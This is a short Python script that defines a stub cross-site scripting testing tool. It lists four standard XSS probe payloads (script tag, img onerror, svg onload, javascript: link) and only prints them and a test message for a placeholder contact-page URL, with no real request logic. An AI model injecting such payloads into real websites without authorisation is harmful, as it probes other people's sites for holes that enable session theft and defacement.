import string

class XSSTool:
    def __init__(self):
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg/onload=alert('XSS')>",
            "<a href='javascript:alert(1)'>Click me</a>"
        ]

    def generate_payload(self):
        print("XSS Payloads:")
        for payload in self.payloads:
            print(payload)

    def test_xss(self, url, payload):
        # Simulate the URL testing with XSS payload
        print(f"Testing {url} with payload: {payload}")
        # Add actual testing logic here using requests or other libraries for HTTP requests.

if __name__ == "__main__":
    xss_tool = XSSTool()
    xss_tool.generate_payload()

    # Example: Test a URL
    test_url = "http://target-website.com/contact"
    xss_tool.test_xss(test_url, xss_tool.payloads[0])
